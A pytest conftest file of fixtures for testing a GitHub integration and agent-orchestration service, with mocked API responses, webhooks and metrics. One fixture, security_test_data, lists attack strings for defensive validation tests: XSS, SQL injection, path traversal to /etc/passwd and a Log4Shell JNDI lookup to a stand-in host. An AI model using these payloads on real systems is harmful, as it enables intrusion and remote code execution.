"""
GitHub Integration Testing Suite Configuration
Comprehensive pytest configuration with fixtures and test utilities
"""

import pytest
import asyncio
import os
import json
import tempfile
from pathlib import Path
from typing import Dict, Any, List
from unittest.mock import AsyncMock, MagicMock, patch
from dataclasses import dataclass
from datetime import datetime, timedelta

# Test configuration
@dataclass
class TestConfig:
    """Test configuration for GitHub integration suite."""
    mock_github_api: bool = True
    enable_real_github_calls: bool = False
    test_repo_owner: str = "test-owner"
    test_repo_name: str = "test-repo"
    test_session_id: str = "test-session-github"
    krag_test_namespace: str = "test_github_integration"
    max_test_timeout: int = 30
    
    @property
    def test_repo_full_name(self) -> str:
        return f"{self.test_repo_owner}/{self.test_repo_name}"


@pytest.fixture(scope="session")
def test_config():
    """Global test configuration fixture."""
    return TestConfig()


@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest.fixture
def temp_log_dir():
    """Create temporary directory for test logs."""
    with tempfile.TemporaryDirectory() as temp_dir:
        log_dir = Path(temp_dir) / "test_logs"
        log_dir.mkdir(exist_ok=True)
        yield log_dir


@pytest.fixture
def mock_github_config():
    """Mock GitHub configuration for testing."""
    with patch.dict(os.environ, {
        'GITHUB_TOKEN': 'test-token-123',
        'GITHUB_SERVICE_ENABLED': 'true',
        'GITHUB_RATE_LIMIT_REQUESTS': '100',
        'GITHUB_TIMEOUT': '10',
        'CLAUDE_SESSION_ID': 'test-session-github'
    }):
        yield


@pytest.fixture
def mock_github_api_responses():
    """Mock GitHub API responses for testing."""
    return {
        'auth_user': {
            'login': 'test-user',
            'name': 'Test User',
            'id': 12345,
            'public_repos': 10,
            'plan': {'name': 'free'}
        },
        'repo_info': {
            'id': 123,
            'name': 'test-repo',
            'full_name': 'test-owner/test-repo',
            'owner': {'login': 'test-owner'},
            'private': False,
            'language': 'Python',
            'default_branch': 'main'
        },
        'create_pr': {
            'id': 456,
            'number': 1,
            'title': 'Test Pull Request',
            'url': 'https://github.com/test-owner/test-repo/pull/1',
            'state': 'open',
            'mergeable': True
        },
        'list_issues': {
            'total_count': 2,
            'items': [
                {
                    'id': 789,
                    'number': 1,
                    'title': 'Test Issue 1',
                    'state': 'open',
                    'labels': []
                },
                {
                    'id': 790,
                    'number': 2,
                    'title': 'Test Issue 2',
                    'state': 'closed',
                    'labels': [{'name': 'bug'}]
                }
            ]
        },
        'workflows': [
            {
                'id': 111,
                'name': 'CI',
                'path': '.github/workflows/ci.yml',
                'state': 'active',
                'badge_url': 'https://github.com/test-owner/test-repo/workflows/CI/badge.svg'
            }
        ],
        'workflow_runs': [
            {
                'id': 222,
                'run_number': 1,
                'status': 'completed',
                'conclusion': 'success',
                'workflow_id': 111,
                'created_at': '2023-01-01T00:00:00Z'
            }
        ]
    }


@pytest.fixture
def mock_github_service(test_config, mock_github_api_responses):
    """Create mock GitHub service for testing."""
    mock_service = AsyncMock()
    
    # Mock service configuration
    mock_service.config.enabled = True
    mock_service.config.github_token = 'test-token-123'
    mock_service.config.session_id = test_config.test_session_id
    
    # Mock authentication
    mock_service.authenticate_token.return_value = True
    
    # Mock API methods
    mock_service.get_repo_info.return_value = mock_github_api_responses['repo_info']
    mock_service.create_pull_request.return_value = mock_github_api_responses['create_pr']
    mock_service.manage_issues.return_value = mock_github_api_responses['list_issues']
    mock_service.list_workflows.return_value = mock_github_api_responses['workflows']
    mock_service.get_workflow_runs.return_value = mock_github_api_responses['workflow_runs']
    
    # Add missing methods for testing
    mock_service.process_webhook.return_value = {'success': True, 'event_id': 'webhook-123'}
    mock_service.notify_operation_complete.return_value = 'notification-sent'
    mock_service.handle_operation_request.return_value = 'handled'
    mock_service.health_check.return_value = {'status': 'healthy', 'service': 'github'}
    
    # Mock internal methods
    mock_service._make_request = AsyncMock()
    
    # Setup context manager support
    mock_service.__aenter__ = AsyncMock(return_value=mock_service)
    mock_service.__aexit__ = AsyncMock(return_value=None)
    
    return mock_service


@pytest.fixture
def mock_event_bus(test_config):
    """Create mock event bus for testing."""
    mock_bus = AsyncMock()
    
    # Mock configuration
    mock_bus.krag_namespace = test_config.krag_test_namespace
    mock_bus.session_id = test_config.test_session_id
    
    # Mock methods
    mock_bus.publish_event.return_value = "test-event-id-123"
    mock_bus.subscribe_handler.return_value = "test-subscription-id-123"
    mock_bus.unsubscribe_handler.return_value = True
    mock_bus.get_event_history.return_value = []
    mock_bus.get_performance_metrics.return_value = {
        'events_published': 0,
        'events_processed': 0,
        'subscriptions_active': 0,
        'errors_count': 0
    }
    
    # Mock event storage
    mock_bus.event_history = []
    mock_bus.subscriptions = {}
    
    return mock_bus


@pytest.fixture
def mock_primary_controller(test_config, mock_github_service, mock_event_bus):
    """Create mock primary controller for testing."""
    mock_controller = AsyncMock()
    
    # Mock initialization
    mock_controller.session_id = test_config.test_session_id
    mock_controller.krag_primary_namespace = test_config.krag_test_namespace
    mock_controller.github_service = mock_github_service
    mock_controller.event_bus = mock_event_bus
    
    # Mock core methods
    mock_controller.delegate_github_task.return_value = {
        'success': True,
        'result': {'status': 'completed', 'message': 'Task completed successfully'},
        'token_id': 'test-token-123',
        'coherence_score': 0.85,
        'operation_time': 0.5,
        'agent_name': 'test-agent'
    }
    
    mock_controller.validate_permissions.return_value = True
    mock_controller.aggregate_results.return_value = {
        'success': True,
        'saga_id': 'test-saga-123',
        'participating_agents': ['test-agent'],
        'operations_completed': 1
    }
    
    mock_controller.enforce_quality_gates.return_value = True
    
    # Mock metrics
    mock_controller.get_orchestration_metrics.return_value = {
        'operations': {
            'delegated': 0,
            'completed': 0,
            'failed': 0,
            'success_rate': 0.0,
            'failure_rate': 0.0,
            'avg_operation_time': 0.0
        },
        'quality': {
            'gate_failures': 0,
            'token_validations': 0,
            'circuit_breaker_trips': 0
        }
    }
    
    mock_controller.health_check.return_value = {
        'timestamp': datetime.now().isoformat(),
        'session_id': test_config.test_session_id,
        'overall_status': 'healthy',
        'components': {
            'github_service': {'status': 'healthy'},
            'event_bus': {'status': 'healthy'},
            'token_manager': {'status': 'healthy'},
            'circuit_breakers': {'status': 'healthy'},
            'saga_orchestrator': {'status': 'healthy'}
        }
    }
    
    # Context manager support
    mock_controller.__aenter__ = AsyncMock(return_value=mock_controller)
    mock_controller.__aexit__ = AsyncMock(return_value=None)
    
    return mock_controller


@pytest.fixture
def mock_krag_tools():
    """Mock KRAG memory tools for testing."""
    mock_tools = MagicMock()
    
    # Mock memory operations
    mock_tools.add_memory = AsyncMock(return_value=True)
    mock_tools.search_memory = AsyncMock(return_value=[])
    mock_tools.update_memory = AsyncMock(return_value=True)
    mock_tools.delete_memory = AsyncMock(return_value=True)
    
    return mock_tools


@pytest.fixture
def performance_thresholds():
    """Performance benchmarks for testing."""
    return {
        'max_response_time': 2.0,  # seconds
        'min_throughput': 100,     # requests per minute
        'max_memory_usage': 100,   # MB
        'max_cpu_usage': 80,       # percentage
        'min_success_rate': 90,    # percentage
        'max_error_rate': 5        # percentage
    }


@pytest.fixture
def security_test_data():
    """Test data for security validation."""
    return {
        'valid_tokens': ['valid-token-123', 'another-valid-token'],
        'invalid_tokens': ['', 'invalid', '123', 'short'],
        'malicious_inputs': [
            '<script>alert("xss")</script>',
            '"; DROP TABLE users; --',
            '../../../etc/passwd',
            '${jndi:ldap://malicious.com/a}'
        ],
        'test_permissions': {
            'valid_agent': ['github_operations', 'code_analysis'],
            'invalid_agent': [],
            'restricted_agent': ['testing_validation']
        }
    }


@pytest.fixture
def github_webhook_payloads():
    """Sample GitHub webhook payloads for testing."""
    return {
        'push': {
            'action': None,
            'repository': {
                'id': 123,
                'name': 'test-repo',
                'full_name': 'test-owner/test-repo',
                'owner': {'login': 'test-owner'}
            },
            'pusher': {'name': 'test-user'},
            'commits': [
                {
                    'id': 'abc123',
                    'message': 'Test commit',
                    'author': {'name': 'Test User', 'email': 'test@example.com'}
                }
            ]
        },
        'pull_request': {
            'action': 'opened',
            'repository': {
                'id': 123,
                'name': 'test-repo', 
                'full_name': 'test-owner/test-repo',
                'owner': {'login': 'test-owner'}
            },
            'pull_request': {
                'id': 456,
                'number': 1,
                'title': 'Test PR',
                'state': 'open',
                'user': {'login': 'test-user'},
                'base': {'ref': 'main'},
                'head': {'ref': 'feature-branch'}
            },
            'sender': {'login': 'test-user'}
        },
        'issues': {
            'action': 'opened',
            'repository': {
                'id': 123,
                'name': 'test-repo',
                'full_name': 'test-owner/test-repo',
                'owner': {'login': 'test-owner'}
            },
            'issue': {
                'id': 789,
                'number': 1,
                'title': 'Test Issue',
                'state': 'open',
                'user': {'login': 'test-user'}
            },
            'sender': {'login': 'test-user'}
        }
    }


@pytest.fixture
def test_data_factory():
    """Factory for generating test data."""
    class TestDataFactory:
        @staticmethod
        def create_operation(
            operation_type: str = "repository_analysis",
            agent_name: str = "test-agent",
            **kwargs
        ) -> Dict[str, Any]:
            return {
                'operation_type': operation_type,
                'agent_name': agent_name,
                'description': f'Test {operation_type}',
                'parameters': kwargs.get('parameters', {}),
                'validation_criteria': kwargs.get('validation_criteria', [
                    'operation parameters valid',
                    'agent capabilities matched'
                ]),
                **kwargs
            }
        
        @staticmethod
        def create_workflow(
            workflow_name: str = "test_workflow",
            agents: List[str] = None,
            operations: List[Dict[str, Any]] = None
        ) -> Dict[str, Any]:
            if agents is None:
                agents = ["planner", "coder"]
            if operations is None:
                operations = [
                    {'agent_name': 'planner', 'operation_type': 'repository_analysis'},
                    {'agent_name': 'coder', 'operation_type': 'code_review'}
                ]
            
            return {
                'workflow_name': workflow_name,
                'agents': agents,
                'operations': operations
            }
        
        @staticmethod
        def create_deliverable(
            deliverable_type: str = "workflow_output",
            **kwargs
        ) -> Dict[str, Any]:
            return {
                'type': deliverable_type,
                'content': f'Test {deliverable_type} content',
                'timestamp': datetime.now().isoformat(),
                'version': '1.0',
                **kwargs
            }
    
    return TestDataFactory()


@pytest.fixture
async def cleanup_test_data():
    """Fixture to cleanup test data after tests."""
    # Setup
    cleanup_tasks = []
    
    yield cleanup_tasks
    
    # Cleanup
    for task in cleanup_tasks:
        try:
            await task()
        except Exception:
            pass  # Ignore cleanup errors


class MockResponse:
    """Mock HTTP response for testing."""
    
    def __init__(self, json_data: Dict[str, Any], status: int = 200, headers: Dict[str, str] = None):
        self.json_data = json_data
        self.status = status
        self.status_code = status
        self.headers = headers or {}
        self.content_type = 'application/json'
    
    async def json(self):
        return self.json_data
    
    async def text(self):
        return json.dumps(self.json_data)


@pytest.fixture
def mock_http_session():
    """Mock aiohttp session for HTTP requests."""
    mock_session = AsyncMock()
    
    async def mock_request(method, url, **kwargs):
        return MockResponse({'mock': 'response'})
    
    mock_session.request = mock_request
    mock_session.__aenter__ = AsyncMock(return_value=mock_session)
    mock_session.__aexit__ = AsyncMock(return_value=None)
    
    return mock_session


def pytest_configure(config):
    """Pytest configuration hook."""
    # Set asyncio mode for all tests
    config.option.asyncio_mode = "auto"


def pytest_collection_modifyitems(config, items):
    """Automatically mark async tests."""
    for item in items:
        if asyncio.iscoroutinefunction(item.function):
            item.add_marker(pytest.mark.asyncio)


# Custom pytest markers
pytest_plugins = ['pytest_asyncio']


def pytest_runtest_setup(item):
    """Setup hook for individual tests."""
    # Add test-specific environment variables
    if not os.getenv('CLAUDE_SESSION_ID'):
        os.environ['CLAUDE_SESSION_ID'] = 'test-session-github'